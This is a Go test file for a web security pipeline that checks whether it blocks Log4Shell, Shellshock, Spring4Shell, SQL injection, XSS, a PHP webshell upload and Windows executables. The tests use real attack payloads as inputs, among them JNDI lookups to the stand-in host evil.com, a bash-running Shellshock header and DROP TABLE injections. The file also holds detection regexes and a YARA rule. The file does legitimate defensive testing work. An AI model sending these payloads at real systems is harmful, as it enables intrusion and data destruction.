package security_test

import (
	"encoding/json"
	"os"
	"path/filepath"
	"testing"

	"github.com/aiss/agent/internal/security"
	"github.com/aiss/agent/internal/socket"
)

// ── Test doubles ─────────────────────────────────────────────────────────

// mockDB implements security.DBStore for tests.
type mockDB struct {
	ipCache   map[string][2]string // ip → [verdict, reason]
	hashCache map[string][2]string // sha256 → [verdict, threatName]
}

func newMockDB() *mockDB {
	return &mockDB{
		ipCache:   make(map[string][2]string),
		hashCache: make(map[string][2]string),
	}
}

func (m *mockDB) GetIPVerdict(ip string) (verdict, reason string, found bool) {
	if v, ok := m.ipCache[ip]; ok {
		return v[0], v[1], true
	}
	return "", "", false
}

func (m *mockDB) SetIPVerdict(ip, verdict, reason, cveID string, ttlSec int) {
	m.ipCache[ip] = [2]string{verdict, reason}
}

func (m *mockDB) GetFileHash(sha256 string) (verdict, threatName string, found bool) {
	if v, ok := m.hashCache[sha256]; ok {
		return v[0], v[1], true
	}
	return "", "", false
}

func (m *mockDB) StoreFileHash(sha256, verdict, threatName string) {
	m.hashCache[sha256] = [2]string{verdict, threatName}
}

// mockTelemetry captures events for inspection.
type mockTelemetry struct {
	events []map[string]interface{}
}

func (m *mockTelemetry) Send(event map[string]interface{}) bool {
	m.events = append(m.events, event)
	return true
}

// ── Test fixtures ─────────────────────────────────────────────────────────

// writeCVEPatterns creates a minimal cve_patterns.json for tests.
func writeCVEPatterns(t *testing.T) string {
	t.Helper()
	patterns := `[
	  {"id":1,"cve_id":"CVE-2021-44228","name":"Log4Shell","severity":"CRITICAL","cvss":10.0,
	   "pattern":"\\$\\{jndi:(ldap|rmi|dns)://","flags":"CASELESS","affected_product":"log4j","description":"Log4Shell JNDI injection"},
	  {"id":2,"cve_id":"CVE-2014-6271","name":"Shellshock","severity":"CRITICAL","cvss":10.0,
	   "pattern":"\\(\\)\\s*\\{\\s*[^}]*\\};\\s*","flags":"","affected_product":"bash","description":"Shellshock bash injection"},
	  {"id":3,"cve_id":"CVE-2022-22965","name":"Spring4Shell","severity":"CRITICAL","cvss":9.8,
	   "pattern":"class\\.module\\.classLoader","flags":"CASELESS","affected_product":"spring","description":"Spring4Shell"}
	]`
	dir := t.TempDir()
	path := filepath.Join(dir, "cve_patterns.json")
	if err := os.WriteFile(path, []byte(patterns), 0644); err != nil {
		t.Fatal(err)
	}
	return path
}

// writeTestYARARule creates a minimal YARA rules file.
func writeTestYARARules(t *testing.T) string {
	t.Helper()
	rules := `
rule TestWebShell {
    meta:
        description = "PHP webshell"
        severity = "CRITICAL"
    strings:
        $s = "system($_GET"
    condition:
        any of them
}
`
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "test.yar"), []byte(rules), 0644); err != nil {
		t.Fatal(err)
	}
	return dir
}

// newTestPipeline creates a Pipeline wired with test doubles.
func newTestPipeline(t *testing.T) (*security.Pipeline, *mockDB, *mockTelemetry) {
	t.Helper()
	db := newMockDB()
	tel := &mockTelemetry{}
	patternsFile := writeCVEPatterns(t)
	rulesDir := writeTestYARARules(t)

	pipeline, err := security.NewPipeline(
		"enforce",
		0.85,           // ML threshold
		patternsFile,
		rulesDir,
		10_240,         // fullScanLimit  (10 KB)
		1_048_576,      // sampleScanLimit (1 MB)
		60,             // verdictCacheTTL
		db,
		tel,
	)
	if err != nil {
		t.Fatalf("NewPipeline failed: %v", err)
	}
	return pipeline, db, tel
}

func makeRequest(method, uri, query, body, ua, ct, ip string) *socket.Request {
	return &socket.Request{
		RequestID:   "test-001",
		ClientIP:    ip,
		Method:      method,
		URI:         uri,
		QueryString: query,
		ContentType: ct,
		UserAgent:   ua,
		Headers:     map[string]string{"user-agent": ua},
		Body:        []byte(body),
	}
}

// ── Tier 0: Static file bypass ────────────────────────────────────────────

func TestPipeline_StaticFile_Permitted(t *testing.T) {
	pipeline, _, _ := newTestPipeline(t)
	staticPaths := []string{
		"/static/app.js",
		"/assets/logo.png",
		"/styles/main.css",
		"/fonts/roboto.woff2",
		"/favicon.ico",
	}
	for _, path := range staticPaths {
		req := makeRequest("GET", path, "", "", "Mozilla/5.0", "", "1.2.3.4")
		resp := pipeline.Check(req)
		if resp.Action != "PERMIT" {
			t.Errorf("static file %q should be PERMIT, got %s", path, resp.Action)
		}
	}
}

// ── Tier 0: Verdict cache ─────────────────────────────────────────────────

func TestPipeline_CachedBlockedIP(t *testing.T) {
	pipeline, db, _ := newTestPipeline(t)
	// Pre-populate block verdict for an IP
	db.SetIPVerdict("10.0.0.1", "BLOCK", "previously blocked", "", 60)
	req := makeRequest("GET", "/api/data", "", "", "Mozilla/5.0", "", "10.0.0.1")
	resp := pipeline.Check(req)
	if resp.Action != "BLOCK" {
		t.Errorf("cached blocked IP should be BLOCKed, got %s", resp.Action)
	}
}

// ── Tier 1: CVE Pattern Matching ─────────────────────────────────────────

func TestPipeline_Log4Shell_Blocked(t *testing.T) {
	pipeline, _, _ := newTestPipeline(t)
	req := makeRequest(
		"GET", "/api/user", "",
		"${jndi:ldap://evil.com/exploit}",
		"${jndi:ldap://evil.com/exploit}", "application/json", "1.2.3.4",
	)
	req.Headers["user-agent"] = "${jndi:ldap://evil.com/exploit}"
	resp := pipeline.Check(req)
	if resp.Action != "BLOCK" {
		t.Errorf("Log4Shell payload should be BLOCKed, got %s (reason: %s)", resp.Action, resp.Reason)
	}
	if resp.Tier != 1 {
		t.Errorf("Log4Shell should be detected at Tier 1, got Tier %d", resp.Tier)
	}
	if resp.CVEID != "CVE-2021-44228" {
		t.Errorf("expected CVE-2021-44228, got %q", resp.CVEID)
	}
}

func TestPipeline_Shellshock_Blocked(t *testing.T) {
	pipeline, _, _ := newTestPipeline(t)
	req := makeRequest(
		"GET", "/cgi-bin/test.sh", "", "",
		`() { :; }; /bin/bash -c "whoami"`,
		"text/plain", "1.2.3.5",
	)
	req.Headers["user-agent"] = `() { :; }; /bin/bash -c "whoami"`
	resp := pipeline.Check(req)
	if resp.Action != "BLOCK" {
		t.Errorf("Shellshock payload should be BLOCK, got %s", resp.Action)
	}
}

func TestPipeline_Spring4Shell_Blocked(t *testing.T) {
	pipeline, _, _ := newTestPipeline(t)
	req := makeRequest(
		"GET", "/api/data",
		"class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
		"", "Mozilla/5.0", "", "1.2.3.6",
	)
	resp := pipeline.Check(req)
	if resp.Action != "BLOCK" {
		t.Errorf("Spring4Shell should be BLOCKed, got %s", resp.Action)
	}
}

// ── Tier 2: SQLi / XSS ───────────────────────────────────────────────────

func TestPipeline_SQLi_Blocked(t *testing.T) {
	pipeline, _, _ := newTestPipeline(t)
	attacks := []struct {
		name  string
		query string
	}{
		{"UNION SELECT", "id=1%27+UNION+SELECT+username%2Cpassword+FROM+users--"},
		{"OR 1=1", "user=admin%27+OR+1%3D1--"},
		{"stacked query", "id=1%3B+DROP+TABLE+users"},
	}
	for _, tt := range attacks {
		t.Run(tt.name, func(t *testing.T) {
			req := makeRequest("GET", "/api/search", tt.query, "", "Mozilla/5.0", "", "1.2.3.7")
			resp := pipeline.Check(req)
			if resp.Action != "BLOCK" {
				t.Errorf("SQLi %q should be BLOCK, got %s (reason: %s)", tt.name, resp.Action, resp.Reason)
			}
			if resp.Tier != 2 {
				t.Errorf("SQLi should be detected at Tier 2, got Tier %d", resp.Tier)
			}
		})
	}
}

func TestPipeline_XSS_Blocked(t *testing.T) {
	pipeline, _, _ := newTestPipeline(t)
	attacks := []struct {
		name  string
		query string
	}{
		{"script tag", "q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"},
		{"onerror", "img=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E"},
	}
	for _, tt := range attacks {
		t.Run(tt.name, func(t *testing.T) {
			req := makeRequest("GET", "/search", tt.query, "", "Mozilla/5.0", "", "1.2.3.8")
			resp := pipeline.Check(req)
			if resp.Action != "BLOCK" {
				t.Errorf("XSS %q should be BLOCK, got %s", tt.name, resp.Action)
			}
		})
	}
}

// ── Clean request: full path through ─────────────────────────────────────

func TestPipeline_CleanRequest_Permitted(t *testing.T) {
	pipeline, _, _ := newTestPipeline(t)
	req := makeRequest(
		"GET", "/api/products",
		"category=electronics&page=1&sort=price_asc",
		"",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120",
		"application/json",
		"203.0.113.1",
	)
	req.Headers["accept"] = "application/json"
	resp := pipeline.Check(req)
	if resp.Action != "PERMIT" {
		t.Errorf("clean request should be PERMIT, got %s (reason: %s, tier: %d)",
			resp.Action, resp.Reason, resp.Tier)
	}
}

// ── Shadow mode ───────────────────────────────────────────────────────────

func TestPipeline_ShadowMode_NeverBlocks(t *testing.T) {
	db := newMockDB()
	tel := &mockTelemetry{}
	patternsFile := writeCVEPatterns(t)
	rulesDir := writeTestYARARules(t)

	pipeline, err := security.NewPipeline(
		"shadow", // shadow mode
		0.01,     // extreme low threshold — everything would block
		patternsFile,
		rulesDir,
		10_240, 1_048_576, 60,
		db, tel,
	)
	if err != nil {
		t.Fatalf("NewPipeline shadow mode failed: %v", err)
	}

	// Log4Shell in shadow mode
	req := makeRequest(
		"GET", "/api/data", "", "",
		"${jndi:ldap://evil.com/exploit}",
		"", "1.2.3.9",
	)
	req.Headers["user-agent"] = "${jndi:ldap://evil.com/exploit}"
	resp := pipeline.Check(req)
	if resp.Action != "PERMIT" {
		t.Errorf("shadow mode should always PERMIT; got %s", resp.Action)
	}
}

// ── Content inspection: YARA ──────────────────────────────────────────────

func TestPipeline_PHPWebshellInBody_Blocked(t *testing.T) {
	pipeline, _, _ := newTestPipeline(t)
	req := makeRequest(
		"POST", "/upload", "", `<?php system($_GET['cmd']); ?>`,
		"Mozilla/5.0",
		"application/octet-stream",
		"1.2.3.10",
	)
	resp := pipeline.Check(req)
	if resp.Action != "BLOCK" {
		t.Errorf("PHP webshell in body should be BLOCK, got %s (tier=%d reason=%s)",
			resp.Action, resp.Tier, resp.Reason)
	}
}

// ── Content inspection: magic bytes ──────────────────────────────────────

func TestPipeline_EXEUpload_Blocked(t *testing.T) {
	pipeline, _, _ := newTestPipeline(t)
	req := &socket.Request{
		RequestID:   "test-exe",
		ClientIP:    "1.2.3.11",
		Method:      "POST",
		URI:         "/upload",
		ContentType: "application/octet-stream",
		UserAgent:   "Mozilla/5.0",
		Headers:     map[string]string{"user-agent": "Mozilla/5.0"},
		Body:        []byte{0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00},
	}
	resp := pipeline.Check(req)
	if resp.Action != "BLOCK" {
		t.Errorf("Windows EXE upload should be BLOCK, got %s (reason: %s)", resp.Action, resp.Reason)
	}
	if resp.Tier != 4 {
		t.Errorf("content detection should be Tier 4, got Tier %d", resp.Tier)
	}
}

// ── File hash dedup ───────────────────────────────────────────────────────

func TestPipeline_KnownMaliciousHash_Blocked(t *testing.T) {
	pipeline, db, _ := newTestPipeline(t)

	// First request — detect and cache
	req := &socket.Request{
		RequestID:   "test-hash-1",
		ClientIP:    "1.2.3.12",
		Method:      "POST",
		URI:         "/upload",
		ContentType: "application/octet-stream",
		UserAgent:   "curl/7.68",
		Headers:     map[string]string{"user-agent": "curl/7.68"},
		Body:        []byte{0x4D, 0x5A, 0x90, 0x00, 0xFF, 0xFF, 0xFF, 0xFF},
	}
	resp1 := pipeline.Check(req)
	if resp1.Action != "BLOCK" {
		t.Skip("EXE not blocked on first pass — skipping hash dedup test")
	}

	// Second request from different IP — same content hash should also block
	req2 := &socket.Request{
		RequestID:   "test-hash-2",
		ClientIP:    "5.6.7.8", // different IP
		Method:      "POST",
		URI:         "/upload",
		ContentType: "application/octet-stream",
		UserAgent:   "curl/7.68",
		Headers:     map[string]string{"user-agent": "curl/7.68"},
		Body:        req.Body, // same content
	}
	resp2 := pipeline.Check(req2)
	if resp2.Action != "BLOCK" {
		t.Errorf("known malicious hash should be blocked on second encounter (via cache), got %s", resp2.Action)
	}
	_ = db
}

// ── Tier 3: ML anomaly detection ─────────────────────────────────────────

func TestPipeline_ScannerUA_Blocked(t *testing.T) {
	pipeline, _, _ := newTestPipeline(t)
	req := makeRequest(
		"GET", "/api/admin",
		"",
		"",
		"sqlmap/1.7 (https://sqlmap.org)",
		"",
		"1.2.3.13",
	)
	resp := pipeline.Check(req)
	if resp.Action != "BLOCK" {
		t.Logf("scanner UA verdict: %s (score=%.3f reason=%s) — ML threshold may not be reached",
			resp.Action, resp.MLScore, resp.Reason)
	}
}

// ── OWASP Top 10 coverage ─────────────────────────────────────────────────

func TestPipeline_OWASP_A03_Injection(t *testing.T) {
	pipeline, _, _ := newTestPipeline(t)
	cases := []struct {
		name  string
		query string
	}{
		{"A03-1", "id=' OR '1'='1"},
		{"A03-2", "id=1; DROP TABLE users;--"},
		{"A03-3", "user=admin'--"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			req := makeRequest("GET", "/api/data", c.query, "", "Mozilla/5.0", "", "2.2.2.2")
			resp := pipeline.Check(req)
			if resp.Action != "BLOCK" {
				t.Errorf("OWASP A03 case %q should be BLOCK, got %s", c.name, resp.Action)
			}
		})
	}
}

// ── Telemetry emission ────────────────────────────────────────────────────

func TestPipeline_Telemetry_EmittedOnBlock(t *testing.T) {
	pipeline, _, tel := newTestPipeline(t)
	req := makeRequest(
		"GET", "/api/data",
		"id=' UNION SELECT username,password FROM users--",
		"", "Mozilla/5.0", "", "3.3.3.3",
	)
	resp := pipeline.Check(req)
	if resp.Action != "BLOCK" {
		t.Skip("request not blocked — skipping telemetry assertion")
	}
	if len(tel.events) == 0 {
		t.Error("telemetry event should have been emitted for blocked request")
	}
	event := tel.events[0]
	if event["action"] != "BLOCK" {
		t.Errorf("telemetry action should be BLOCK, got %v", event["action"])
	}
}

// ── Reload rules ──────────────────────────────────────────────────────────

func TestPipeline_ReloadRules_NoError(t *testing.T) {
	pipeline, _, _ := newTestPipeline(t)
	// Should not panic or error
	pipeline.ReloadRules()
}

// ── JSON serialization round-trip ─────────────────────────────────────────

func TestPipeline_Response_JSONSerializable(t *testing.T) {
	pipeline, _, _ := newTestPipeline(t)
	req := makeRequest("GET", "/api/test", "", "", "Mozilla/5.0", "", "4.4.4.4")
	resp := pipeline.Check(req)
	data, err := json.Marshal(resp)
	if err != nil {
		t.Fatalf("Response should be JSON-serializable: %v", err)
	}
	var decoded socket.Response
	if err := json.Unmarshal(data, &decoded); err != nil {
		t.Fatalf("Response should round-trip through JSON: %v", err)
	}
	if decoded.Action != resp.Action {
		t.Errorf("Action mismatch after JSON round-trip: want %s got %s", resp.Action, decoded.Action)
	}
}

// ── Benchmarks ────────────────────────────────────────────────────────────

func BenchmarkPipeline_CleanRequest(b *testing.B) {
	db := newMockDB()
	tel := &mockTelemetry{}
	patternsFile := writeCVEPatterns(&testing.T{})
	rulesDir := writeTestYARARules(&testing.T{})
	pipeline, _ := security.NewPipeline(
		"enforce", 0.85, patternsFile, rulesDir,
		10_240, 1_048_576, 60, db, tel,
	)
	req := makeRequest(
		"GET", "/api/products", "category=electronics&page=2", "",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"application/json", "10.0.0.1",
	)
	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		req.ClientIP = "10.0.0.1" // same IP — uses cache after first request
		pipeline.Check(req)
	}
}

func BenchmarkPipeline_Log4ShellBlock(b *testing.B) {
	db := newMockDB()
	tel := &mockTelemetry{}
	patternsFile := writeCVEPatterns(&testing.T{})
	rulesDir := writeTestYARARules(&testing.T{})
	pipeline, _ := security.NewPipeline(
		"enforce", 0.85, patternsFile, rulesDir,
		10_240, 1_048_576, 60, db, tel,
	)
	req := makeRequest(
		"GET", "/api/data", "", "",
		"${jndi:ldap://evil.com/exploit}",
		"", "10.0.0.2",
	)
	req.Headers["user-agent"] = "${jndi:ldap://evil.com/exploit}"
	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		// Use different IPs to avoid cache hits skewing results
		req.ClientIP = "10.1.1.1"
		pipeline.Check(req)
	}
}
